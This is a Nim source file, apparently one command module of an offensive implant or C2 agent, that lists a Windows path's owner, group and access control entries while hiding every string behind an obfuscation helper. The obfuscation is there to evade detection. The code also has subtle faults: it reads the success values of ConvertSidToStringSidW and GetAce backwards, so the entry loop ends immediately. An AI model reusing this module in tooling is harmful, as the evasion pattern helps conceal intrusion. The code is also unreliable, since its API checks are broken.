import std/strutils
import ../utils/global
import ../utils/general/strings
import ../utils/winapi/handlers
import execution/core

proc run_acl*(args: string; buf: var openArray[char]): int =
  # Builds an access control report for a path
  const
    seFileObject = 1'u32
    secInfo = 1'u32 or 2'u32 or 4'u32
  let path = args.strip()
  if path.len == 0:
    return writeErr(obf("missing path"), buf)
  var w: array[520, uint16]
  asciiWide(path, w)
  var owner: pointer = nil
  var group: pointer = nil
  var dacl: pointer = nil
  var sd: pointer = nil
  let st = getNamedSecurityInfoW(
    addr w[0], seFileObject, secInfo, addr owner, addr group, addr dacl, nil, addr sd,
  )
  if st != 0:
    return writeErr(obf("GetNamedSecurityInfoW failed"), buf, st)
  defer:
    if sd != nil:
      discard localFree(sd)
  var report = obf("path: ") & path & '\n'
  for (tag, sid) in [(obf("owner"), owner), (obf("group"), group)]:
    var line = obf("-")
    if sid != nil:
      var sidStr: pointer = nil
      if convertSidToStringSidW(sid, addr sidStr) == 0 and sidStr != nil:
        defer:
          discard localFree(sidStr)
        line = wideToAscii(sidStr, 256)
      else:
        var nameW: array[256, uint16]
        var domW: array[256, uint16]
        var nameLen: culong = culong(nameW.len)
        var domLen: culong = culong(domW.len)
        var use: culong = 0
        if lookupAccountSidW(nil, sid, addr nameW[0], addr nameLen, addr domW[0], addr domLen, addr use) != 0:
          var nameBuf: array[256, char]
          var domBuf: array[256, char]
          let nn = wtoa(nameW, nameBuf)
          let dn = wtoa(domW, domBuf)
          if dn > 0 and nn > 0:
            var domStr = newString(dn)
            var nameStr = newString(nn)
            copyMem(addr domStr[0], addr domBuf[0], dn)
            copyMem(addr nameStr[0], addr nameBuf[0], nn)
            line = domStr & obf("\\") & nameStr
    report.add(tag & obf(": ") & line & '\n')
  if dacl == nil:
    report.add obf("dacl: (none)\n")
    return writeMsg(report, buf)
  report.add obf("dacl:\n")
  var idx: culong = 0
  while true:
    var ace: pointer = nil
    if getAce(dacl, idx, addr ace) != 0:
      break
    let aceType = cast[ptr byte](ace)[]
    let label = case int(aceType)
      of 0: obf("ALLOW")
      of 1: obf("DENY")
      else: obf("ACE")
    let mask = cast[ptr culong](cast[int](ace) + 4)[]
    let aceSid = cast[pointer](cast[int](ace) + 8)
    var sidLine = obf("(unknown sid)")
    if aceSid != nil:
      var sidStr: pointer = nil
      if convertSidToStringSidW(aceSid, addr sidStr) == 0 and sidStr != nil:
        defer:
          discard localFree(sidStr)
        sidLine = wideToAscii(sidStr, 256)
      else:
        var nameW: array[256, uint16]
        var domW: array[256, uint16]
        var nameLen: culong = culong(nameW.len)
        var domLen: culong = culong(domW.len)
        var use: culong = 0
        if lookupAccountSidW(nil, aceSid, addr nameW[0], addr nameLen, addr domW[0], addr domLen, addr use) != 0:
          var nameBuf: array[256, char]
          var domBuf: array[256, char]
          let nn = wtoa(nameW, nameBuf)
          let dn = wtoa(domW, domBuf)
          if dn > 0 and nn > 0:
            var domStr = newString(dn)
            var nameStr = newString(nn)
            copyMem(addr domStr[0], addr domBuf[0], dn)
            copyMem(addr nameStr[0], addr nameBuf[0], nn)
            sidLine = domStr & obf("\\") & nameStr
    report.add(obf("  [") & label & obf("] mask=0x") & toHex(mask, 8) & obf(" sid=") & sidLine & '\n')
    idx += 1
  writeMsg(report, buf)
